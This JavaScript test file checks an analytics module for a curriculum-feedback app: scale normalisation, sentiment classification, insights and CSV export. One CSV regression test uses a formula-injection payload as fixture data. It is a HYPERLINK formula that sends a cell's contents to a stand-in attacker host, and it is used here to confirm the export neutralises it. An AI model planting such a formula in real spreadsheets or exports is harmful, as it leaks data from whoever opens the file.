/**
 * Tests for the analytics client layer (FR-34 to FR-42).
 *
 * Run with `npm run check`. No test framework: plain assertions keep the
 * zero-budget dependency list short.
 *
 * Each case here corresponds to a way the numbers could be wrong while still
 * looking plausible on screen. The figures in the assertions were measured
 * against the live database and the real `sentiment` lexicon, not invented.
 */
import assert from 'node:assert/strict'
import { pathToFileURL } from 'node:url'
import path from 'node:path'

const root = process.cwd()
const load = (rel) => import(pathToFileURL(path.join(root, rel)).href)

// queries.js is deliberately NOT imported: it pulls in the Supabase client,
// which needs a browser env. Everything worth asserting is pure and lives in
// the other four modules.
const {
  formatAvg, formatNormalised, axisFor, spansMultipleScales, spansVersions,
  versionNote, pool, assertDenominators,
} = await load('src/lib/analytics/scales.js')
const { createClassifier, POSITIVE_AT, NEGATIVE_AT } = await load('src/lib/analytics/sentiment.js')
const { buildInsights, topTerms, MIN_N } = await load('src/lib/analytics/insights.js')
const { buildCsv, IDENTITY_KEYS, BOM, fileName, COLUMNS } = await load('src/lib/analytics/csv.js')

let passed = 0
const check = (label, fn) => {
  fn()
  passed += 1
  console.log(`  ok  ${label}`)
}

// ---------- fixtures ----------
/** Faculty rate out of 4; everyone else out of 5. */
const facultyRow = {
  stakeholder_type: 'faculty', question_key: 'industry_relevance',
  question_text: 'Industry relevance', scale_id: 's-4', min_score: 1, max_score: 4,
  n_answers: 3, n_scored: 2, n_not_applicable: 1, score_sum: 7, avg_score: 3.5,
  normalised_sum: (4 - 1) / 3 + (3 - 1) / 3, normalised_avg: (3.5 - 1) / (4 - 1),
  versions_answered: 1, versions_total: 1, version_nos: [1],
}

const studentRow = {
  stakeholder_type: 'student', question_key: 'course_design',
  question_text: 'Course design', scale_id: 's-5', min_score: 1, max_score: 5,
  n_answers: 2, n_scored: 2, n_not_applicable: 0, score_sum: 8, avg_score: 4,
  normalised_sum: 1.5, normalised_avg: (4 - 1) / (5 - 1),
  versions_answered: 1, versions_total: 1, version_nos: [1],
}

console.log('\nscales — the faculty 4-point trap')

check('an average always renders with its ceiling', () => {
  assert.equal(formatAvg(facultyRow), '3.50 / 4')
  assert.equal(formatAvg(studentRow), '4.00 / 5')
})

check('faculty 3.5/4 normalises to 83%, not the 62.5% a hardcoded 5 gives', () => {
  // Verified in SQL: (3.5-1)/(4-1) = 0.8333 vs (3.5-1)/(5-1) = 0.625.
  assert.equal(formatNormalised(facultyRow.normalised_avg), '83%')
  assert.notEqual(formatNormalised(facultyRow.normalised_avg), '63%')
})

check('a null average is an em dash, never a zero', () => {
  // recharts draws a gap for null and a floor-scraping dip for 0, and the
  // second reads as "rated terribly".
  assert.equal(formatAvg({ avg_score: null, max_score: 5 }), '—')
  assert.equal(formatNormalised(null), '—')
})

check('a mixed-scale chart is forced onto a normalised axis', () => {
  const mixed = axisFor([facultyRow, studentRow])
  assert.equal(mixed.normalised, true)
  assert.deepEqual(mixed.domain, [0, 1])
  assert.match(mixed.caption, /different rating scales/)
})

check('a single-scale chart keeps its own raw domain', () => {
  assert.deepEqual(axisFor([facultyRow]).domain, [1, 4])
  assert.deepEqual(axisFor([studentRow]).domain, [1, 5])
  assert.equal(axisFor([studentRow]).caption, null)
})

check('spansMultipleScales sees the difference', () => {
  assert.equal(spansMultipleScales([facultyRow, studentRow]), true)
  assert.equal(spansMultipleScales([studentRow, { ...studentRow, question_key: 'other' }]), false)
})

console.log('\nscales — pooling without averaging averages')

check('REGRESSION: pooling uses sums, not the mean of the means', () => {
  // 40 answers at 2.0 and 2 at 5.0 pool to 2.143; averaging the averages
  // gives 3.5 — a 1.36-point overstatement driven by the tiny group.
  const big = { ...studentRow, n_answers: 40, n_scored: 40, n_not_applicable: 0, score_sum: 80, avg_score: 2, normalised_sum: 10 }
  const small = { ...studentRow, n_answers: 2, n_scored: 2, n_not_applicable: 0, score_sum: 10, avg_score: 5, normalised_sum: 2 }

  const result = pool([big, small])
  assert.equal(result.n_scored, 42)
  assert.ok(Math.abs(result.avg_score - 90 / 42) < 1e-9)
  assert.notEqual(result.avg_score, 3.5)
})

check('pooling across scales refuses to produce a raw average', () => {
  const result = pool([facultyRow, studentRow])
  assert.equal(result.avg_score, null, 'a raw average across a 4- and 5-point scale is meaningless')
  assert.equal(result.mixedScales, true)
  assert.ok(result.normalised_avg > 0)
})

check('an all-not-applicable slice yields null, not NaN or zero', () => {
  const allNa = { ...facultyRow, n_answers: 3, n_scored: 0, n_not_applicable: 3, score_sum: 0, avg_score: null, normalised_sum: 0 }
  const result = pool([allNa])
  assert.equal(result.avg_score, null)
  assert.equal(result.normalised_avg, null)
})

check('pooling nothing returns null rather than a zeroed row', () =>
  assert.equal(pool([]), null))

console.log('\nscales — FR-34 version flags')

check('the badge fires on versions ANSWERED, not versions that exist', () => {
  // Live data: student/overall_effectiveness has 2 versions with both answers
  // on v1. Flagging it would be a lie about data that spans nothing.
  const reworded = { ...studentRow, versions_answered: 1, versions_total: 2, version_nos: [1] }
  assert.equal(spansVersions(reworded), false)
  assert.match(versionNote(reworded), /Reworded since/)

  const genuinelyMixed = { ...studentRow, versions_answered: 2, versions_total: 2, version_nos: [1, 2] }
  assert.equal(spansVersions(genuinelyMixed), true)
  assert.match(versionNote(genuinelyMixed), /spans 2 wordings/)
})

check('a never-edited question says nothing at all', () =>
  assert.equal(versionNote(studentRow), null))

console.log('\nqueries — the denominator invariant')

check('scored + not-applicable must equal total answers', () => {
  assert.doesNotThrow(() => assertDenominators(facultyRow))
  assert.throws(
    () => assertDenominators({ ...facultyRow, n_answers: 99 }),
    /denominators disagree/,
    'a fanned-out join must be caught before it reaches a chart',
  )
})

console.log('\nsentiment')

/** Mirrors the real lexicon's measured output for these exact strings. */
const fakeAnalyzer = {
  analyze(text) {
    const table = {
      'no complaints': { score: -3, comparative: -1.5, words: ['complaints', 'no'] },
      'not bad': { score: 3, comparative: 1.5, words: ['bad'] },
      'Excellent': { score: 3, comparative: 3, words: ['excellent'] },
      'Poor': { score: -2, comparative: -2, words: ['poor'] },
      'More lab time please': { score: 1, comparative: 0.25, words: ['please'] },
      'terrible outdated equipment': { score: -5, comparative: -1.67, words: ['terrible', 'outdated'] },
      'excellent teaching and great support': { score: 6, comparative: 1.2, words: ['excellent', 'great'] },
      // AFINN's measured score for the F-6 complaints, so the fix is asserted
      // against the lexicon's real verdict rather than a neutral stand-in.
      'nothing works in the labs, equipment is terrible': {
        score: -3, comparative: -0.33, words: ['terrible'],
      },
      'nothing is ever fixed here': { score: -2, comparative: -0.33, words: ['fixed'] },
      'nothing but problems with the wifi': {
        score: -2, comparative: -0.29, words: ['problems'],
      },
      'nothing to change, the course is well designed': {
        score: 2, comparative: 0.22, words: ['well'],
      },
    }
    return table[text] ?? { score: 0, comparative: 0, words: [] }
  },
}
const { classify, summarise } = createClassifier(fakeAnalyzer)

check('REGRESSION: "no complaints" is positive, not negative', () => {
  // The lexicon scores it -3: `no` (-1) + `complaints` (-2), never seeing the
  // negation. A satisfied respondent counted as a complaint is the wrong
  // answer in the direction that matters most.
  const result = classify('no complaints')
  assert.equal(result.label, 'positive')
  assert.match(result.reason, /absence of a problem/)
})

check('other absence-of-problem phrasings are handled too', () => {
  for (const text of ['No major issues', 'no problems at all', 'No significant concerns']) {
    assert.equal(classify(text).label, 'positive', text)
  }
})

check('REGRESSION: a complaint that starts with "nothing" is not satisfaction', () => {
  // The verb after the noun phrase was optional, so the pattern reduced to the
  // bare word `nothing` plus a space and was tested BEFORE the lexicon. The
  // matched substring was literally "nothing ", and it inverted the verdict on
  // the most substantive complaints on the form - moving FR-41's gate with it.
  for (const text of [
    'nothing works in the labs, equipment is terrible',
    'nothing is ever fixed here',
    'nothing but problems with the wifi',
  ]) {
    assert.equal(classify(text).label, 'negative', text)
  }
})

check('a genuine "nothing to change" is still read as satisfaction', () => {
  const result = classify('nothing to change, the course is well designed')
  assert.equal(result.label, 'positive')
  assert.match(result.reason, /absence of a problem/)
})

check('REGRESSION: the bare phrases the alternation names are positive, not negative', () => {
  // "no changes" and "no suggestions" failed the mandatory \s+ and read
  // negative on the word "no" - the same error mirrored.
  for (const text of ['no changes', 'No suggestions', 'no changes needed']) {
    assert.equal(classify(text).label, 'positive', text)
  }
})

check('"nothing wrong at all" is not turned into a complaint by the fix', () =>
  assert.equal(classify('nothing wrong at all').label, 'positive'))

check('non-answers are their own bucket, not neutral', () => {
  // Counting "nil" as neutral would make the headline finding "most feedback is
  // neutral" on a form where most people skipped the box.
  for (const text of ['', '  ', '-', 'na', 'N/A', 'nil', 'None', 'nothing', 'x']) {
    assert.equal(classify(text).label, 'none', JSON.stringify(text))
  }
})

check('a long complaint is not diluted into neutral', () => {
  // The real lexicon gives this comparative -0.027, so any comparative
  // threshold files the most substantive complaint on the form as neutral.
  const result = classify('terrible outdated equipment')
  assert.equal(result.label, 'negative')
  assert.ok(result.score <= NEGATIVE_AT)
})

check('politeness is not praise', () => {
  // "please" alone scores +1; positive needs POSITIVE_AT.
  assert.equal(classify('More lab time please').label, 'neutral')
  assert.equal(POSITIVE_AT, 2)
})

check('genuine praise still reads positive', () =>
  assert.equal(classify('excellent teaching and great support').label, 'positive'))

check('a verdict always names the words behind it', () => {
  const result = classify('terrible outdated equipment')
  assert.deepEqual(result.words, ['terrible', 'outdated'])
  assert.match(result.reason, /"terrible"/)
})

check('shares are a percentage of people who actually wrote something', () => {
  const summary = summarise([
    { value_text: 'excellent teaching and great support' },
    { value_text: 'terrible outdated equipment' },
    { value_text: 'nil' },
    { value_text: 'na' },
  ])
  assert.equal(summary.total, 4)
  assert.equal(summary.counts.none, 2)
  assert.equal(summary.opinionated, 2)
  assert.equal(summary.share.positive, 0.5)
})

check('an empty batch produces null shares, not NaN', () => {
  const summary = summarise([])
  assert.equal(summary.opinionated, 0)
  assert.equal(summary.share.positive, null)
})

check('the classifier refuses to be built without an analyzer', () =>
  assert.throws(() => createClassifier(null), /analyze/))

console.log('\ninsights')

check('rankings use normalised scores, so faculty are judged on their own scale', () => {
  // Raw: faculty 3.5 beats student 3.2. Normalised: faculty 0.833 vs student
  // 0.55 — the ordering only makes sense after normalising.
  const weakStudent = { ...studentRow, n_scored: 5, avg_score: 3.2, normalised_avg: (3.2 - 1) / 4, question_text: 'Course design' }
  const strongFaculty = { ...facultyRow, n_scored: 5, avg_score: 3.5, normalised_avg: (3.5 - 1) / 3 }

  const { insights } = buildInsights([weakStudent, strongFaculty])
  const lowest = insights.find((i) => i.kind === 'lowest_rated')
  assert.equal(lowest.subject, 'Course design')
})

check('thin questions are excluded from rankings and the exclusion is reported', () => {
  const thin = { ...studentRow, n_scored: 1, n_answers: 1, question_text: 'Barely answered' }
  const solid = { ...studentRow, n_scored: 10, question_text: 'Well answered', question_key: 'other' }

  const { insights, excluded } = buildInsights([thin, solid])
  assert.equal(excluded.questions, 1)
  assert.match(excluded.reason, new RegExp(`fewer than ${MIN_N}`))
  assert.ok(!insights.some((i) => i.subject === 'Barely answered'))
})

check('nothing rankable produces no claims rather than a fabricated one', () => {
  const { insights } = buildInsights([{ ...studentRow, n_scored: 1 }])
  assert.equal(insights.filter((i) => i.kind === 'lowest_rated').length, 0)
})

check('every insight carries its evidence, including the scale ceiling', () => {
  const { insights } = buildInsights([{ ...facultyRow, n_scored: 8 }])
  const lowest = insights.find((i) => i.kind === 'lowest_rated')
  assert.match(lowest.detail, /out of 4/)
  assert.match(lowest.detail, /8 scored answers/)
})

check('a heavily not-applicable question is surfaced as a finding', () => {
  const naHeavy = { ...facultyRow, n_answers: 10, n_scored: 4, n_not_applicable: 6 }
  const { insights } = buildInsights([naHeavy])
  const na = insights.find((i) => i.kind === 'not_applicable')
  assert.ok(na)
  assert.match(na.detail, /6 of 10/)
})

check('a version-spanning average is called out', () => {
  const mixed = { ...studentRow, n_scored: 9, versions_answered: 2, versions_total: 2, version_nos: [1, 2] }
  const { insights } = buildInsights([mixed])
  assert.ok(insights.some((i) => i.kind === 'version_spanning'))
})

check('a term counts once per answer, not once per repetition', () => {
  const rows = [
    { value_text: 'laboratory laboratory laboratory', sentiment: { label: 'negative' } },
    { value_text: 'the laboratory needs work', sentiment: { label: 'negative' } },
  ]
  const [top] = topTerms(rows, 1)
  assert.equal(top.term, 'laboratory')
  assert.equal(top.count, 2, 'three mentions by one person must not outweigh two people')
})

check('stop words and one-off terms are filtered out', () => {
  const rows = [{ value_text: 'the course is very good and the faculty are good', sentiment: { label: 'positive' } }]
  const terms = topTerms(rows, 5).map((t) => t.term)
  assert.ok(!terms.includes('the'))
  assert.ok(!terms.includes('course'))
})

console.log('\ncsv')

const exportRow = {
  response_id: 'r-1', cycle_label: '2025-26', stakeholder_type: 'student',
  program: 'B.Sc CS', course_title: 'Statistics III',
  submitted_at: '2026-03-01T10:00:00Z', updated_at: '2026-03-01T10:00:00Z',
  question_key: 'course_design', question_text: 'Course design',
  question_type: 'rating', version_no: 1, is_current_version: true,
  scale_name: 'excellent_to_poor', value_text: 'Excellent',
  value_numeric: 5, value_options: null,
}

check('REGRESSION: a formula in free text is neutralised', () => {
  // Papa quotes it correctly and still leaves it executable in Excel, where it
  // can exfiltrate the rest of the sheet.
  const attack = {
    ...exportRow, question_key: 'recommendations', question_type: 'long_text',
    value_text: '=HYPERLINK("http://evil.tld/?d="&A1,"Click")', value_numeric: null,
  }
  const { csv } = buildCsv([attack])
  const line = csv.split('\n').find((l) => l.includes('HYPERLINK'))
  assert.ok(!/(^|,)"?=HYPERLINK/.test(line), `cell is still a live formula: ${line}`)
})

check('the other formula prefixes are covered too', () => {
  for (const payload of ['+1+1', '-1+1', '@SUM(A1)', '=1+1']) {
    const { csv } = buildCsv([{ ...exportRow, question_key: 'recommendations', value_text: payload }])
    const line = csv.split('\n')[1]
    assert.ok(!new RegExp(`(^|,)"?\\${payload[0]}`).test(line), `unescaped: ${payload}`)
  }
})

check('ordinary text is not mangled by the escaping', () => {
  const { csv } = buildCsv([{ ...exportRow, question_key: 'recommendations', value_text: 'More lab time' }])
  assert.ok(csv.includes('More lab time'))
})

check('commas, quotes and newlines survive a round trip', () => {
  const messy = { ...exportRow, question_key: 'recommendations', value_text: 'Labs, "urgently"\nand seats' }
  const { csv } = buildCsv([messy])
  assert.ok(csv.includes('"Labs, ""urgently""'))
})

check('REGRESSION: identity answers are excluded by default', () => {
  // Dropping user_id does NOT de-identify the file: the name is itself an
  // answer to an ordinary question on the form.
  const withPii = [
    { ...exportRow, question_key: 'name', value_text: 'Priya Sharma', value_numeric: null },
    { ...exportRow, question_key: 'sap_number', value_text: '60012345', value_numeric: null },
    exportRow,
  ]
  const { csv, rowCount, excludedIdentityRows } = buildCsv(withPii)
  assert.equal(rowCount, 1)
  assert.equal(excludedIdentityRows, 2)
  assert.ok(!csv.includes('Priya Sharma'))
  assert.ok(!csv.includes('60012345'))
})

check('identity cannot be re-enabled by passing an option', () => {
  // Deliberately no opt-in: NFR-4 keeps personal data inside the app, and a
  // downloaded file has already left its access controls behind.
  const withPii = [{ ...exportRow, question_key: 'name', value_text: 'Priya Sharma', value_numeric: null }]
  const { csv, rowCount } = buildCsv(withPii, { includeIdentity: true })
  assert.equal(rowCount, 0)
  assert.ok(!csv.includes('Priya Sharma'))
})

check('the identity list covers the PRD profile fields', () => {
  for (const key of ['name', 'sap_number', 'contact_number', 'designation', 'organization']) {
    assert.ok(IDENTITY_KEYS.has(key), key)
  }
})

check('FR-42: version metadata is in the file', () => {
  const { csv } = buildCsv([exportRow, { ...exportRow, version_no: 2, is_current_version: false }])
  assert.ok(csv.includes('Question version'))
  assert.ok(csv.includes('Is current wording'))
  const [, first, second] = csv.split('\n')
  assert.ok(first.includes('yes'))
  assert.ok(second.includes('no'))
})

check('a non-scoring answer exports as blank, never as zero', () => {
  const na = { ...exportRow, value_text: 'Not applicable', value_numeric: null }
  const { csv } = buildCsv([na])
  assert.ok(!/,0,?$/.test(csv.split('\n')[1]), 'a zero here would be averaged by a spreadsheet')
})

check('multi_select choices are joined readably', () => {
  const multi = { ...exportRow, question_type: 'multi_select', value_text: null, value_numeric: null, value_options: ['labs', 'library'] }
  const { csv } = buildCsv([multi])
  assert.ok(csv.includes('labs; library'))
})

check('the BOM is a real byte-order mark', () => {
  // Without it Excel on Windows mojibakes the en dash in "Academics – teaching".
  assert.equal(BOM, '﻿')
  assert.equal(BOM.charCodeAt(0), 0xfeff)
})

check('the file name reflects the filters', () => {
  assert.equal(fileName({ cycleLabel: '2025-26', stakeholder: 'student' }), 'curriculum-feedback-2025-26-student.csv')
  assert.equal(fileName(), 'curriculum-feedback.csv')
})

check('an empty export still produces a header row', () => {
  const { csv, rowCount } = buildCsv([])
  assert.equal(rowCount, 0)
  assert.ok(csv.startsWith(COLUMNS[0].label))
})

console.log(`\n${passed} analytics checks passed\n`)
